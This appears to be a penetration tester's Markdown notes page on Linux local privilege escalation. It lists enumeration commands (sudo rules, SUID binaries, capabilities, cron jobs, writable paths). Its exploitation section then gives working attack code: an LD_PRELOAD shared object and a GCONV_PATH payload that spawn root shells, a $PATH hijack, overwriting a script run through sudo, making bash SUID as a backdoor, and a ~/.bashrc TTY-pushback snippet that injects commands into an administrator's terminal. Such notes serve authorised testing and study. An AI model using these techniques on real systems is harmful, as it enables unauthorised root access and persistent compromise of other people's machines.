---
title: Linux Privilege Escalation
---

Local [[notes/mitre-attack/privilege-escalation]] on [[notes/linux/index]].

This is not meant to be a comprehensive list, but rather a list of quick checks before moving on to heavier tools like [[notes/tools/linpeas]].

Services:

- [explainshell.com](https://explainshell.com/)

Untested tools:

- [traitor](https://github.com/liamg/traitor)
- [beroot](https://github.com/AlessandroZ/BeRoot)

References:

- [book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [exploit-notes.hdks.org/exploit/linux/privilege-escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/)

# Discovery

## Sudo

List sudoers rules for the current user.

~~~ bash
sudo -l
~~~

List users that can use `sudo`.

~~~ bash
grep -e wheel -e sudo /etc/group
~~~

Try to read all sudoers rules.

~~~ bash
cat /etc/sudoers /etc/sudoers.d/*
~~~

# SUID Binaries

List files with SUID/SGID flag.

~~~ bash
find / -type f -perm /u=s,g=s ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
~~~

# Capabilities

Show capabilities of the current user.

~~~ bash
grep CapEff /proc/self/status  # pass to capsh --decode
~~~

List executables with extra capabilities.

~~~ bash
getcap -r / 2> /dev/null
~~~

# Processes

List running processes.
Focus on processes running as other users, especially root.
Check program arguments for insecure options.

~~~ bash
ps aux|grep -v "^$USER"
ps aux|grep ^root
ps aux|less -S
cat /proc/sched_debug
~~~

Watch processes as they start with [pspy](https://github.com/DominicBreuker/pspy).

~~~ bash
./pspy64 -pf
~~~

# Cron Jobs

Check for non-standard cron jobs.

~~~ bash
crontab -l
grep --color -v -e '^#' -e '^\s*$' /etc/crontab
grep --color -vr -e '^#' -e '^\s*$' /etc/cron.d/
grep --color -v -e '^#' -e '^\s*$' /etc/anacrontab
cat /var/spool/cron/crontabs/*
tail /var/log/cron.log
~~~

# System Services

Check for non-standard services.

~~~ bash
systemctl
ls -la /etc/systemd/system/
ls -la /etc/init.d/
ls -la /etc/rc.d/
~~~

# Local Services

Check services running on `localhost`.

~~~ bash
ip a || ifconfig
ip route || route || routel
ss -tulpen || netstat -tulpen
~~~

# File Permissions

Check if one of the following paths are writable.

~~~ bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
~~~

List custom scripts.

~~~ bash
find /usr/bin/ -type f '(' -name '*.sh' -or -name '*.py' ')' ! -path /usr/bin/gettext.sh -ls 2> /dev/null
ls -la /usr/local/
ls -la /usr/local/bin/
ls -la /usr/local/sbin/
ls -la /usr/local/lib/
ls -la /opt/
~~~

List recently written files.

~~~ bash
find / -type f ! -path '/sys/*' ! -path '/proc/*' ! -path '/run/*' ! -path '/snap/*' ! -path '/var/lib/lxcfs/cgroup/*' -printf '%T@ %M %u:%g %TY-%Tm-%Td %TH:%TM %p\n' 2> /dev/null | sort -k 1 -V | cut -d ' ' -f 2-
~~~

List paths writable by the current user.

~~~ bash
find / -writable ! -type l ! -path "$HOME/*" ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
find / -writable ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
~~~

List paths not belonging to root.

~~~ bash
find / '(' ! -uid 0 -or ! -gid 0 ')' ! -path "$HOME/*" ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
find / '(' ! -uid 0 -or ! -gid 0 ')' ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
~~~

List paths belonging to a specific user.

~~~ bash
find / '(' -user hacker -or -group hacker ')' ! -path '/sys/*' ! -path '/proc/*' -ls 2> /dev/null
~~~

# Exploitation

Misconfigurations:

- You can execute an unsafe program as root, e.g. trough sudo or because it has the SUID bit set -> [gtfobins.github.io](https://gtfobins.github.io/)
- A sudoers rule allows to run a safe program, but `env_reset` is disabled -> [$LD_PRELOAD Exploitation]($ld_preload-exploitation)
- A SUID binary runs a program with relative path -> [$PATH Exploitation](#$path-exploitation)
- You can execute a program as root that is stored in a directory where you have write access -> [Root-owned Binary in User-owned Directory](#root-owned-binary-in-user-owned-directory)
- A program that runs as root executes a file that is writable by you.
- The system-wide `$PATH` environment variable contains a directory that you can write into.
- A privileged program loads a library from a location writable by you -> [Shared Object Hijacking](#shared-object-hijacking)
- A privileged program executes a file writable by you.
- Pythons `sys.path` contains a writable directory or `$PYTHONPATH` can be set/modified in a privileged context.
- A privileged user executes a command in the context of your user -> [TTY Pushback](#tty-pushback)
- Your current user context or a program you can execute has interesting capabilities -> see [False boundaries and arbitrary code execution](https://web.archive.org/web/20221105182023/http://forums.grsecurity.net/viewtopic.php?f=7&t=2522) for escalation paths

Got code execution as root, but can't get a stable shell?
Set the SUID flag on `bash`.

~~~ bash
chmod +S /bin/bash
bash -p
~~~

## $PATH Exploitation

~~~ bash
mkdir ./mypath/
cat << EOF > ./mypath/PROGAM_NAME
#!/bin/sh
id > /tmp/hacked.txt
EOF
export PATH="$PWD/mypath:$PATH"
/usr/local/bin/suid-binary
~~~

## $LD_PRELOAD Exploitation

`./exploit.c`:

~~~ c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
~~~

~~~ bash
gcc -fPIC -shared -o ./exploit.so ./exploit.c -nostartfiles
sudo LD_PRELOAD="$PWD/exploit.so" /some/executable with some options
~~~

## $GCONV_PATH Exploitation

If a program uses GLib (the Gnome library, not GNU Lib C) and it's somehow possible to set an environment variable, then a GLib feature can be abused for code execution.

~~~ bash
mkdir -p /tmp/pwn/
cat << 'EOF' > /tmp/pwn/gconv-modules
module PAYLOAD// INTERNAL  /tmp/pwn/payload 2
module INTERNAL  PAYLOAD// /tmp/pwn/payload 2
EOF
cat << 'EOF' > /tmp/pwn/payload.c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  puts("pwned");
  system("/bin/sh");
  exit(0);
}
EOF
gcc /tmp/pwn/payload.c -o /tmp/pwn/payload.so -shared -fPIC
~~~

When the environment variable `GCONV_PATH=/tmp/pwn` can be set for the target program, `payload.so` is loaded.

Another rare occasion is, when the second parameter of `fopen()` is user controlled input.
For example when the resulting call is `fopen("random-path-that-does-not-have-to-exist", "r,ccs=payload");`.

References:

- [Getting arbitrary code execution from fopen's 2nd argument](http://web.archive.org/web/20221222190538/https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/)

## Root-owned Binary in User-owned Directory

~~~
$ sudo -l
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
$ ls -la
total 44
drwx------ 3 cyber cyber 4096 Jan 20 01:51 .
drwxr-xr-x 4 root  root  4096 Nov 16 15:28 ..
-rw------- 1 cyber cyber  104 Jan 20 01:52 .bash_history
-rw-r--r-- 1 cyber cyber  220 Nov  9 21:06 .bash_logout
-rwx------ 1 root  root   349 Nov 15 18:33 run.py
$ mv ./run.py ./run.py.bak
$ echo "$PAYLOAD" > ./run.py
$ sudo /usr/bin/python3 /home/cyber/run.py
~~~

## Shared Object Hijacking

DLL Hijacking on Linux.

Search order:

1. Directories hardcoded into the executable's `RPATH`
2. Directories specified in the `LD_LIBRARY_PATH` environment variable
3. Directories listed in the executable's `RUNPATH` value
4. Directories specified in `/etc/ld.so.conf`
5. System library directories like `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`, `/usr/local/lib`, `/usr/local/lib64`, and potentially more

Check if libraries loaded by SUID/SGID binaries can be modified.

~~~ bash
ldd $binary | sed -E 's|^\t||; s| =>.*?$||; s|\(.*?\)$||;' | xargs -r -I {} -- find /lib* /usr/lib* /usr/local/lib* -maxdepth 10 -name '{}' -ls 2> /dev/null
strace $binary 2>&1 | grep -iE 'open|access|no such file'
~~~

## TTY Pushback

If you control a user and an admin switches to your user via `su` (without `-P`) or `sudo` (while `use_pty` is not enabled) you can write shell commands into the admins TTY.

This can be exploited by adding the following snippet to your `~/.bashrc`:

~~~ bash
cat << 'EOF' | python3
import fcntl, os, signal, sys, termios
os.kill(os.getppid(), signal.SIGSTOP)
for char in ' set +o history\nchmod +S /bin/bash\nfg\nreset\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
EOF
~~~

References:

- [The oldest privesc: injecting careless administrators' terminals using TTY pushback](http://web.archive.org/web/20230312123234/https://www.errno.fr/TTYPushback.html)

## More Ideas

- [Local root exploits - Modified system environment](http://web.archive.org/web/20221201212324/https://www.win.tue.nl/~aeb/linux/hh/hh-12.html)
  - close file descriptor 2 before `exec()`, the next file that is opened and written to gets printed to stderr instead
  - `exec()` with modified `argv[0]`
  - cause a disk full condition in the right moment
  - cause a stack overflow in the right moment by shrinking the stack size with `ulimit -s 100`
  - kill the target program in the right moment by setting up an alarm signal to be sent after a prespecified time and fork off the target binary
- [Race conditions](http://web.archive.org/web/20221201212330/https://www.win.tue.nl/~aeb/linux/hh/hh-9.html)
  - predictable temporary file names
  - time of check time of use issues (TOCTOU)
    - slow down execution
      - deep symlinks
      - scheduling priority
